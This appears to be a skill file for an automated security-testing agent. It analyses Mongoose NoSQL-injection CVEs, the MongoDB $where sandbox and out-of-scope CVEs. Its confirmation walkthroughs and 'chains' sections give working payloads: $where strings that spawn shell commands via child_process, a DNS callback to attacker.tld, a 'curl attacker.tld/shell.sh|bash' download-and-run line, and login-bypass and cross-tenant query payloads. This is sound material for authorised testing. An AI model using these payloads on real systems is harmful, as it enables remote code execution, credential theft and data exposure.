---
name: nosql-injection-novel-deep
description: NoSQL injection at the 2024–2026 frontier — Mongoose CVE-2024-53900 + CVE-2025-23061 $where RCE chain via sift application-side evaluation, MongoDB 8.0 $where sandbox mechanism, and the CVEs that must be explicitly excluded from NoSQLi scope
sibling: nosql_injection
load_when: scan_mode == "deep"
---

# NoSQL Injection — Novel + Frontier Depth

This is the novel+frontier deep sibling to `nosql_injection.md`. The base owns the class framing, PortSwigger taxonomy, primary payloads per store, $where JS primer with sleep()-falsy nuance, express-mongo-sanitize discussion, OWASP WSTG probe set, and primary chains. The advanced+expert sibling `nosql_injection_advanced_deep.md` owns driver behavior differentials, aggregation-pipeline injection depth, blind extraction methodology, OOB channels, per-store sink depth, WAF bypass classes, and composite-chain construction. This file owns the 2024–2026 CVE mechanism decomposition anchored on the Mongoose $where RCE chain, the MongoDB 8.0 $where sandbox depth, the sift-library application-side evaluation class, the CVE-2024-53900 → CVE-2025-23061 bypass anatomy, and the explicit non-scope for MongoDB-ecosystem CVEs that share a superficial shape but are not NoSQLi.

Load this file when the target is a Mongoose-backed Node.js app, when the reachable primitive is application-side $where eval (as opposed to server-side query-scoped injection), or when a recently disclosed MongoDB-ecosystem CVE needs its scope confirmed (injection vs disclosure vs DoS) before treating it as a NoSQLi finding.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch8/nosql_injection/{ghsa,nvd,other-sources}/` per the 1:1 manifest at `.zen-batch-artifacts/batch8/nosql_injection/MANIFEST.md`.

## 2024–2026 CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version/GHSA metadata lives here.

| CVE | GHSA | Package | Vulnerable ranges | Patched | CVSS |
|---|---|---|---|---|---|
| CVE-2024-53900 | GHSA-m7xq-9374-9rvx | mongoose | ≥ 8.0.0-rc0 < 8.8.3; ≥ 7.0.0-rc0 < 7.8.3; ≥ 6.0.0-rc0 < 6.13.5; ≥ 3.6.0-rc0 < 5.13.23 | 8.8.3 / 7.8.3 / 6.13.5 / 5.13.23 | 9.1 (NVD v3.1); 9.8 (GHSA) |
| CVE-2025-23061 | GHSA-vg7j-7cwx-8wgw | mongoose | ≥ 8.0.0-rc0 < 8.9.5; ≥ 7.0.0-rc0 < 7.8.4; < 6.13.6 | 8.9.5 / 7.8.4 / 6.13.6 | 9.8 (NVD v3.1 Primary); 9.0 (CNA Secondary) |
| CVE-2026-42334 | GHSA-wpg9-53fq-2r8h | mongoose | < 6.13.9; ≥ 7.0.0 < 7.8.9; ≥ 8.0.0 < 8.22.1; ≥ 9.0.0 < 9.1.6 | 6.13.9 / 7.8.9 / 8.22.1 / 9.1.6 | 7.5 (NVD v3.1) |

Notes on the table:
- **Four Mongoose branches affected by CVE-2024-53900**: the 8.x, 7.x, 6.x, and 5.x lines each received a coordinated fix release (8.8.3, 7.8.3, 6.13.5, 5.13.23) on the 2024-11-26 disclosure day.
- **CVE-2025-23061 does not list a 5.x fix** — the 5.x branch was end-of-life at the time of the second disclosure. Deployments still on 5.x are unpatched for the bypass; the mitigation is upgrade to a maintained branch (6.13.6+ / 7.8.4+ / 8.9.5+).
- **CVSS scoring differential**: GHSA scores CVE-2024-53900 at 9.8 (Availability: High), NVD at 9.1 (Availability: None). The discrepancy reflects whether the primitive is scored as RCE with process-crash impact vs RCE with data-integrity-only impact. Use NVD as the authoritative v3.1 score; note both.
- **CVSS scope change** on CVE-2025-23061: `S:C` (scope changed) versus CVE-2024-53900's `S:U`. The scope-changed rating on the bypass reflects that the CVE-2024-53900 mitigation was known and the bypass explicitly reaches beyond it — an incomplete-fix classification.
- **CVE-2026-42334 is a distinct mechanism from CVE-2025-23061** — it targets `sanitizeFilter`, not `populate().match`. The `sanitizeFilter` guard wraps query operators in `$eq` to neutralize them; `$nor` was not in the set of logical operators recursively walked. The `populate().match` guard rejected `$where` in filters; the incomplete-fix chain is CVE-2024-53900 → CVE-2025-23061 (both populate().match). CVE-2026-42334 is a separate guard with the same bypass shape (missing logical combinator recursion).
- **Four Mongoose branches affected by CVE-2026-42334**: the fix ships in four coordinated releases (6.13.9, 7.8.9, 8.22.1, 9.1.6). The 9.x branch is new relative to the earlier CVEs; CVE-2026-42334 is the first Mongoose NoSQLi CVE to include a 9.x-branch fix.

## Mongoose $where RCE Chain — CVE-2024-53900 and CVE-2025-23061

Primitive: application-side JavaScript evaluation of a user-controlled `$where` filter, executed in the Node.js process (not the MongoDB server). Because the evaluation happens outside MongoDB's server-side sandbox, the primitive is arbitrary JavaScript execution in the application's runtime — Node.js RCE, not database-scoped extraction.

### Root cause: sift-library application-side evaluation

The vulnerable code path is Mongoose's `populate()` implementation. When a `.populate({path: 'related', match: <filter>})` call is made, Mongoose does NOT send the match filter to MongoDB as part of the query — instead, it fetches the related documents and then applies the match filter application-side, using the `sift` library.

The internal flow:
```
Model.find(...).populate({path: 'x', match: userInput})
  → Query#_execPopulateQuery()
    → Query#_done()
      → Query#_assign()
        → sift(match, doc)     // application-side evaluation
```

The `sift` library implements MongoDB's operator syntax in pure JavaScript for client-side/application-side filtering. Its implementation of `$where` calls `eval()` on the JavaScript string — without MongoDB's server-side `--noscripting` toggle, without the sandbox that strips access to `global`, and without the primitive-blocking that server-side $where enforces.

Consequence: an attacker who reaches the populate().match filter with `{$where: "<JS>"}` executes `<JS>` in the Node.js process directly. From there, the standard Node RCE primitives are reachable — `require`, `process`, `child_process`, `fs`, network, everything.

**Source-anchored quote (OpsWat technical writeup, corroborated by Mongoose maintainer's own blog and sift docs):** "sift() function allows these functions to be executed without such restrictions." The consequence explains the 9.0-9.1 CVSS — RCE, not just data extraction.

### CVE-2024-53900 — direct $where in populate().match

Primitive: `Model.find(...).populate({path: 'related', match: {$where: 'attackerJS'}})` — the match filter includes $where directly at the top level.

Payload for exploitation via a JSON body endpoint that lifts request body into populate().match:
```json
{
  "match": {
    "$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()"
  }
}
```
The `this.constructor.constructor('return process')` polyglot reaches the Node global `process` via the function-constructor escape hatch. `mainModule.require('child_process').execSync` executes the attacker command.

Fix commit: `c9e86bff` ("fix: disallow using $where in match"). Mongoose 8.8.3 (2024-11-26) rejects `match: {$where: ...}` at the populate() call site — the top-level `$where` key inside match is denied.

Timeline: 2024-11-07 discovery → 2024-11-26 fix released → 2024-12-02 CVE-2024-53900 disclosed.

### CVE-2025-23061 — nested-$where bypass of the CVE-2024-53900 fix

Primitive: same root cause (sift application-side eval), but the CVE-2024-53900 fix only guarded top-level match keys. A `$where` nested inside `$or`, `$and`, or `$nor` — all of which are logical combinators that take an array of sub-filters — was not walked into by the guard.

Bypass payload:
```json
{
  "match": {
    "$or": [
      {"$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch /tmp/pwn').toString()"}
    ]
  }
}
```
The top-level key is `$or` (allowed); the guard did not recurse into the array; sift evaluated the nested `$where` and reached the same eval primitive.

Fix commit: closes the guard's recursion gap by walking into `$or`/`$and`/`$nor` arrays and rejecting any nested `$where`. Mongoose 8.9.5 (2025-01-13), 7.8.4, and 6.13.6.

Timeline: 2024-12-17 bypass identified → 2025-01-13 fix released as CVE-2025-23061.

### Class generalization — bypass shape

The bypass shape is a widespread anti-pattern in security-fix code: a top-level-only check on structured input misses the same primitive nested one layer deeper via a logical combinator. Any NoSQLi sanitizer or ORM guard that walks user input and enforces a rule "the top-level filter cannot include operator X" without recursing into `$or`/`$and`/`$nor`/other combinators is likely bypassed by the same shape. Grep target sanitizer implementations for this pattern.

### Confirmation walkthrough

1. Identify a Mongoose endpoint that accepts user input into `populate().match`. Grep for `.populate(` calls where an option's `.match` is derived from `req.body`/`req.query`/`req.params` or a function argument tainted by them.
2. Fingerprint Mongoose version. Approaches: response headers (rare); error stack traces (Node stack includes package version paths); `/api/health` or debug endpoints; source-available lockfile.
3. Match version against the canonical table above. Any deployment on 8.x < 8.9.5, 7.x < 7.8.4, 6.x < 6.13.6, or 5.x < 5.13.23 is exposed.
4. Send an OOB-callback payload:
   ```json
   {"match": {"$or": [{"$where": "require('dns').lookup(`pwn-<random>.oob.attacker.tld`)"}]}}
   ```
   Requires attacker DNS logging infrastructure (interactsh, canarytokens). Callback arrival confirms Node.js code execution.
5. Escalate to a specific-capability payload (data exfil, reverse shell, file read) once the RCE primitive is confirmed.

### Impact scope

- **Full Node.js RCE** — attacker JS runs with the app process's privileges. Access to env vars (secrets, DB credentials, JWT signing keys), filesystem, outbound network.
- **Application-tier reach only** — the primitive is in the app process, not the DB. Data at rest in MongoDB is accessed via the DB credentials the app already has, not via a DB-scoped primitive.
- **Pivot potential** — access to app secrets → downstream services; access to filesystem → persistent implants; access to outbound network → SSRF into the internal environment.

## MongoDB 8.0 $where Sandbox — What Blocks and What Allows

Server-side $where in MongoDB has always run in a JavaScript sandbox, but the sandbox capabilities have narrowed over versions. Understanding what the current sandbox blocks vs allows is the difference between "server-side $where is a nuisance" and "server-side $where is a full RCE primitive."

**MongoDB 8.0 sandbox (current):**

*Blocked:*
- `db` global — no access to other collections/databases from within $where.
- Filesystem primitives — no `fs` equivalent; sandbox has no I/O.
- Network primitives — no fetch, no XHR, no DNS resolution.
- Process/child-process — cannot spawn subprocesses.
- Access to non-current-document properties beyond `this`.

*Allowed:*
- JavaScript expressions on `this` (the current document under evaluation).
- Standard JS built-ins that don't cross the sandbox — string manipulation, math, regex, JSON parsing.
- Available functions: `sleep()`, `assert()`, `emit()` (in mapReduce context), `Date`, `Math`, standard type constructors.

**Implication:** on MongoDB 8.0, server-side $where is a data-extraction and timing-oracle primitive, NOT an RCE primitive. Attacker can still enumerate field values via boolean/timing extraction; attacker cannot escape to the host.

**Older MongoDB versions (pre-8.0):**

- **MongoDB 4.4–7.0**: `$where` deprecated but `javascriptEnabled=true` remains the default. Sandbox similar to 8.0 for the current-document scope, but historically some features (like `db.eval`, removed in 4.2) exposed a broader surface.
- **MongoDB 4.2 and earlier**: `db.eval()` command allowed arbitrary server-side JavaScript with access to the `db` global — this was an RCE primitive against the DB server itself, effectively removed in 4.2.
- **`--noscripting` flag**: available since MongoDB 4.4 as a server-launch option that disables all server-side JavaScript (`$where`, `$function`, `$accumulator`, mapReduce). Not default; must be explicitly enabled.

**Version-fingerprint before payload work:**
```
db.adminCommand({getParameter: 1, javascriptEnabled: 1})
db.version()
```
Or via the query-error surface — MongoDB error messages for $where injection differ across versions (older versions may include richer stack trace; newer versions redact).

**Class differential:**
| Runtime | $where primitive |
|---|---|
| Mongoose populate().match on vulnerable Mongoose (via sift) | Node.js RCE (unsandboxed eval) |
| MongoDB 8.0 server-side $where | Data extraction + timing oracle only (sandbox blocks I/O) |
| MongoDB 4.4–7.0 server-side $where | Data extraction + timing (similar sandbox to 8.0) |
| MongoDB pre-4.2 db.eval() | DB-server RCE (removed in 4.2) |

The Mongoose sift path is the highest-impact primitive available in the current NoSQLi surface because it escapes the DB sandbox entirely.

## Explicit Non-Scope — CVEs That Are NOT NoSQLi

Two 2025 MongoDB-ecosystem CVEs must be explicitly excluded from NoSQLi scope to prevent category-error smuggling. Their surface shape overlaps enough with NoSQLi that a superficial audit could mistake them for injection primitives.

### CVE-2025-14847 — MongoBleed (zlib heap disclosure, NOT NoSQLi)

Primitive: `output.length()` returns the allocated buffer size (not the actual decompressed length) after a zlib decompression call in `message_compressor_zlib.cpp`. Adjacent heap memory beyond the decompressed bytes is included in the returned buffer and leaked back to the connecting client.

**Why this looks like NoSQLi but isn't:** the CVE is in the MongoDB protocol-compression layer, invoked on every wire-protocol message. Attacker who can send wire-protocol messages (i.e., anyone who can talk to the DB directly) gets heap memory disclosure. It is a memory-safety vulnerability in the DB's wire layer, NOT an injection primitive on the query surface.

Affected: MongoDB server versions with zlib compression enabled on the wire. Fixed in 8.2.3 / 8.0.17 / 7.0.28 / 6.0.27 / 5.0.32 / 4.4.30.

**Reporting frame:** if surface-scanning surfaces this CVE against a target, report as memory disclosure, not as NoSQLi. The impact is heap-adjacent data exposure to any client who can send compressed wire messages (typically = anyone with DB access on the network), not attacker-controlled query surface.

### CVE-2025-37727 — Elasticsearch reindex-audit-log CWE-532 (NOT NoSQLi)

Primitive: Elasticsearch's audit logging for reindex API calls records the request body in audit log files (CWE-532: Insertion of Sensitive Information into Log File). If audit logging + auth-success events + request-body logging are all enabled, sensitive data in reindex request bodies gets written to log files.

**Why this looks like NoSQLi (OOB extraction) but isn't:** the reindex-to-remote-cluster shape historically has been an OOB extraction primitive for NoSQLi (write attacker-controlled reindex source that pulls data to an attacker cluster). CVE-2025-37727 is NOT that class — it is a passive log-file information disclosure. Attacker doesn't invoke it via injection; attacker (or anyone with log-file access) reads the logs to see reindex request bodies.

CVSS 5.7 MEDIUM (AV:A adjacent-network only). Fixed via Elasticsearch update; specific version boundaries per Snyk SNYK-JAVA-ORGELASTICSEARCH-13517507.

**Reporting frame:** log-file information disclosure, not OOB NoSQLi extraction. Requires attacker to have log-file access (or be a monitoring service with logs surfaced somewhere), not attacker query surface. Distinct primitive class.

### Class rationale — why the exclusion matters

Every NoSQLi audit needs a category-discipline gate: is the CVE's primitive on the QUERY SURFACE (injection reaches through user input into the query)? If yes, in-scope. If the primitive is on the WIRE (protocol memory safety), STORAGE (encryption, disk), or LOGS (log-file disclosure), out-of-scope for NoSQLi even if the CVE lives in the same product. Applying this gate to CVE-2025-14847 and CVE-2025-37727 keeps the NoSQLi finding pool honest.

## Detection Methodology at the Frontier

**Match target against Mongoose CVE chain:**
1. Fingerprint Mongoose version. Best source: `package-lock.json` if source-available; response error stack traces (Node stacks embed the mongoose version path); banner-grab endpoints (`/api/health`, `/api/version`).
2. If version < 8.9.5 (or 7.8.4 / 6.13.6 / 5.13.23), grep or dynamically probe for populate().match reachability from user input.
3. If populate().match reachable, submit the `$or:[{$where:...}]` bypass shape (works on the CVE-2024-53900-fixed-only versions AND on unpatched versions).
4. Confirm via OOB callback (DNS/HTTP).

**Match target against MongoDB $where surface:**
1. Fingerprint MongoDB version. Via error messages, `/admin/serverStatus` if reachable, or `db.version()` if operator injection allows arbitrary commands.
2. Determine $where enablement: `db.adminCommand({getParameter: 1, javascriptEnabled: 1})`.
3. If enabled, test the sleep()-falsy-safe timing shape (base's guidance) to confirm reachability.
4. Class the impact: sandboxed data-extraction primitive (MongoDB 8.0) vs unsandboxed application-side (Mongoose sift) — the two are different findings with different severity.

**Match target against explicit-non-scope CVEs:**
- If a vulnerability scanner or CVE database flags MongoBleed or the Elasticsearch reindex-audit-log CVE against the target, classify per the § Explicit Non-Scope guidance above. Neither is a NoSQLi finding.

**Refuted claims kept out (per master-prompt refuted-ledger and this pass's 0-3 refutations):**

- **Prisma tagged-template `$queryRaw` escaping inconsistency** — the refuted claim asserted the safe/unsafe distinction depends on invocation form (tagged-template vs string). This was refuted 0-3 by the research pass; the correct statement is: Prisma's `$queryRaw` (tagged-template) DOES escape parameters; `$queryRawUnsafe` (string) does NOT. The safe/unsafe distinction is by method name, not invocation form.
- **"$where is the most commonly used API call permitting arbitrary JavaScript"** (attributed to OWASP WSTG) — the WSTG passage the claim paraphrases does discuss $where as an arbitrary-JS surface, but the "most commonly used" superlative is not in WSTG. Refuted 0-3; keep the OWASP citation to the exact text ("JavaScript is a fully featured language, not only does this allow an attacker to manipulate data, but also to run arbitrary code").
- **OWASP allegedly listing "$where, $regex, $expr, $function" as operators that must be disallowed** — a paraphrase overreaching from OWASP Cheat Sheet content. Refuted 0-3. The cheat sheet's actual guidance is narrower.
- **"Core NoSQL-injection technique is the MongoDB $where operator"** — a criminalip-blog framing that treats $where as the single central technique. Refuted 0-3; the class has multiple primary techniques per PortSwigger's taxonomy (syntax injection AND operator injection), and $where is one of many operators within operator injection.

## Chains — Novel-Tier Composite Constructions

**Chain N1 — Mongoose populate().match → OOB DNS confirmation → RCE:**
1. Endpoint accepts JSON body lifted into `populate({path: 'x', match: reqBody})`.
2. Confirmation probe: `{"$or": [{"$where": "require('dns').lookup('canary-<rand>.oob.attacker.tld')"}]}` — OOB DNS reveals RCE.
3. Weaponized payload: `{"$or": [{"$where": "process.mainModule.require('child_process').execSync('curl attacker.tld/shell.sh|bash')"}]}`.
4. Impact: RCE on the app host; access to app secrets, DB credentials, JWT signing keys.
5. Route: `rce.md` for post-RCE surface; `authentication_jwt.md` if signing key extracted.

**Chain N2 — Persistent bio → nightly report populate().match → RCE in worker:**
1. Attacker writes profile bio JSON containing the payload.
2. Nightly analytics worker reads bio content into a Mongoose populate filter.
3. Same primitive as Chain N1 but delayed trigger; execution in report-worker process.
4. Impact: RCE in the worker context (data pipeline access, S3 credentials, warehouse write privilege).
5. Route: `nosql_injection_advanced_deep.md § Second-Order NoSQL Injection`.

**Chain N3 — GraphQL variable → Mongoose populate → sift RCE:**
1. GraphQL schema exposes an input type with `JSON` scalar field.
2. Resolver lifts input into `populate({path, match: input.filter})`.
3. Attacker submits query with variable `{filter: {"$or": [{"$where": "..."}]}}`.
4. Same execution as Chain N1.
5. Route: `nosql_injection_advanced_deep.md § GraphQL Variable Injection Depth`.

**Chain N4 — Auth bypass → admin API → aggregation $merge → PE:**
1. Basic operator injection on login: `{"username": {"$gt": ""}, "password": {"$gt": ""}}`.
2. Session token used to access admin reporting endpoint.
3. Reporting endpoint accepts pipeline parameter; attacker submits `$merge`-based privilege escalation payload.
4. Impact: PE via merged admin field.
5. Route: `nosql_injection_advanced_deep.md § Composite Chain Construction` chain E.

**Chain N5 — Cross-tenant $lookup pivot in multi-tenant SaaS:**
1. Multi-tenant SaaS aggregation endpoint scoped by tenantId in `$match`.
2. Attacker submits `[{$match: {tenantId: 'attackerTenant'}}, {$lookup: {from: 'billing', localField: 'userId', foreignField: 'userId', as: 'leak'}}]`.
3. `$lookup` ignores tenant scoping; attacker reads billing records across ALL tenants sharing the same billing collection.
4. Impact: cross-tenant data disclosure.
5. Route: `idor.md`, `broken_function_level_authorization.md`.

## Mongoose sanitizeFilter $nor Bypass (CVE-2026-42334)

Primitive: Mongoose's `sanitizeFilter` option is a defense-in-depth mechanism that wraps user-supplied query operators in `$eq` to neutralize them — preventing operator injection even if the application passes unsanitized user input into query conditions. CVE-2026-42334 bypasses this mechanism via `$nor`.

### Root cause: $nor omitted from recursive sanitization

When `sanitizeFilter` is enabled, Mongoose walks query objects and wraps dollar-prefixed keys in `$eq`. For logical combinators (`$and`, `$or`), the walker recurses into the array of sub-filters. Prior to the fix, `$nor` was not included in this set of recursed logical operators. Because `$nor` accepts an array (like `$and` and `$or`), and arrays do not trigger `hasDollarKeys()`, malicious operators inside a `$nor` clause pass through unsanitized.

### Bypass payload

```json
{
  "$nor": [
    {"role": {"$ne": "admin"}}
  ]
}
```

With `sanitizeFilter` enabled, the intended behavior wraps `$ne` in `$eq`, neutralizing it: `{role: {$eq: {$ne: "admin"}}}`. But because `$nor` is not recursed, the `$ne` inside it reaches MongoDB unsanitized: `{$nor: [{role: {$ne: "admin"}}]}` — returning all documents where `role` IS `"admin"`. The attacker inverts the intended filter.

More dangerous operators reachable through the same bypass: `$gt`, `$lt`, `$regex`, `$exists`, `$in` — any MongoDB operator normally neutralized by `sanitizeFilter` is injectable inside `$nor`.

### Bypass shape — same pattern, third instance

The incomplete-fix pattern across the Mongoose CVE chain:

| CVE | Guard mechanism | Missing recursion | Bypass shape |
|---|---|---|---|
| CVE-2024-53900 | populate().match `$where` rejection | Top-level only | `{$where: "..."}` directly |
| CVE-2025-23061 | populate().match `$where` rejection (after 53900 fix) | `$or`/`$and`/`$nor` arrays | `{$or: [{$where: "..."}]}` |
| CVE-2026-42334 | `sanitizeFilter` operator wrapping | `$nor` arrays | `{$nor: [{field: {$ne: "..."}}]}` |

The structural lesson: any query-object walker that enforces a rule at one nesting level must recurse into ALL logical combinators that accept sub-filter arrays. The set is: `$and`, `$or`, `$nor`, `$not` (object, not array), and `$elemMatch` (embeds a sub-query). A guard that misses any one is bypassed by the same shape.

### Confirmation walkthrough

1. Identify a Mongoose endpoint with `sanitizeFilter` enabled (grep for `sanitizeFilter: true` in schema options, connection options, or query middleware).
2. Fingerprint Mongoose version against the canonical table: < 6.13.9, 7.x < 7.8.9, 8.x < 8.22.1, 9.x < 9.1.6.
3. Submit `{"$nor": [{"role": {"$ne": "user"}}]}` as a filter parameter. If the response includes admin-role documents (or any documents that should be excluded by the negated condition), the bypass is confirmed.
4. Escalate: use `$regex` inside `$nor` for data extraction; use `$gt`/`$lt` for range-based enumeration.

### Impact

Query-filter bypass — the attacker circumvents the application's sanitizeFilter defense to inject arbitrary MongoDB operators. Impact depends on the endpoint: authentication bypass (inverting role filters), data extraction (range queries on sensitive fields), or authorization bypass (accessing records outside the user's scope). Lower severity than the populate().match RCE chain (CVSS 7.5 vs 9.0–9.1) because the primitive is query-operator injection, not arbitrary code execution — but it defeats a security mechanism the application explicitly opted into.

## Sift-Class Generalization — Application-Side Query Evaluators as a Surface

The Mongoose CVE chain is anchored in a specific library (`sift`), but the class it exemplifies is broader: any JavaScript library that reimplements MongoDB (or MongoDB-like) query operators for application-side filtering is a candidate for the same primitive class.

**Known application-side query libraries in the Node ecosystem:**
- `sift` — the Mongoose exemplar; supports $where, $regex, $expr, most MongoDB operators.
- `mingo` — similar scope; sometimes used for in-memory filtering.
- `lokijs` — in-memory JSON database with MongoDB-like query API.
- `nedb` (deprecated) — file-based; older codebases still use it.
- Custom implementations — hand-rolled MongoDB-operator interpreters for testing/mocking; these often lack sandboxing entirely.

**Audit shape:** grep target for imports of any of these libraries. Where found, trace user-input reachability into the library's query function. Any user-input reaching a `$where` support in these libraries is the same class as Mongoose CVE-2024-53900.

**Extension to non-Node runtimes:** the same class applies to Python (`mongomock` for tests), Ruby (`mongoid` in some modes), and Java (mocked MongoDB test clients). Verify each library's handling of `$where` — does it delegate to the DB (safe), refuse the operator entirely (safe), or evaluate it in the language runtime (RCE class)?

**Class principle:** anywhere a query operator vocabulary designed for a sandboxed DB engine is reimplemented in a non-sandboxed general-purpose language runtime, the sandbox contract is broken. The remediation is either don't support `$where` in the client-side reimplementation, or explicitly denylist it. Fingerprinting: which query libraries the target uses + whether they support `$where`.

The 2024–2026 frontier for NoSQLi outside the Mongoose sift class is genuinely thinner than the class's overall history: no MongoDB-driver CVEs (native/PyMongo/Java/Mongoid) crossed the primary-source threshold in this research pass, and JS-stack-specific surfaces (tRPC/Next.js server-actions/Prisma raw-query) surfaced no primary-verified 2024–2026 CVEs beyond what the base's classic techniques already cover. The 7-store technique-class coverage in the base carries the non-MongoDB stores at recon depth; genuine per-store CVE-frontier extension awaits new primary-source disclosures.

## Summary

The 2024–2026 NoSQLi frontier is anchored on the Mongoose $where RCE chain (CVE-2024-53900 → CVE-2025-23061 bypass, closed at 8.9.5/7.8.4/6.13.6) — the root cause is application-side evaluation via `sift`, which breaks MongoDB's sandbox contract and turns operator injection into Node.js RCE. The bypass class is a top-level-only guard that misses `$or`-nested operators — an anti-pattern that generalizes across NoSQLi sanitizers. MongoDB 8.0's server-side $where sandbox blocks `db`/filesystem/network, so server-side $where is data-extraction-only, not RCE — the class distinction matters for severity scoping. Two 2025 CVEs (MongoBleed CVE-2025-14847 zlib heap disclosure; CVE-2025-37727 Elasticsearch audit-log CWE-532) are explicitly out-of-scope for NoSQLi — they share superficial primitive shapes with wire-protocol / OOB extraction but are memory-safety / log-file classes. The sift-class generalization identifies the broader surface: any application-side reimplementation of MongoDB operators without sandbox enforcement is a candidate for the same primitive.
